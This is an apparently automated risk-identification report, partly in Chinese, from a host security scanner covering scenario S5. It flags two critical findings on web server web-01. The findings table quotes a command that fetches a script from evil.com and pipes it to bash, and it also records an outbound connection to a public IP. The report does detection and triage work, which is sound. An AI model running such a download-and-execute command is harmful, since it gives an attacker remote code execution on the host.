# Risk Identification Report

- **Scenario**: S5
- **Overall verdict**: high_risk_detected
- **Coverage level**: partial
- **Events scanned**: 2
- **Risk items**: 2
- **P0**: 2

## Data source reminders

- 【建议】缺少 进程文件操作，exec 规则的上下文加权（同窗 file 事件）不可用，WebShell 落地若未体现在 command 中将漏检


## Data gaps

- host_file_op: missing — exec context boost degraded

## Attack chains

- `chain-web-01-1` web-01 P0 conf=0.95


## Top risks

| Severity | Module | Host | Summary |
| --- | --- | --- | --- |
| P0 | exec | web-01 | web-01 443/nginx 子进程下载并执行远程内容: /bin/sh -c curl http://evil.com/a.sh | bash |
| P0 | connect | web-01 | web-01 监听端口 443 进程主动外连公网 203.0.113.99:443 (P0) |

## Recommended next skills

- `traceability-analysis`: 存在 P0 风险，建议溯源攻击链与横向范围
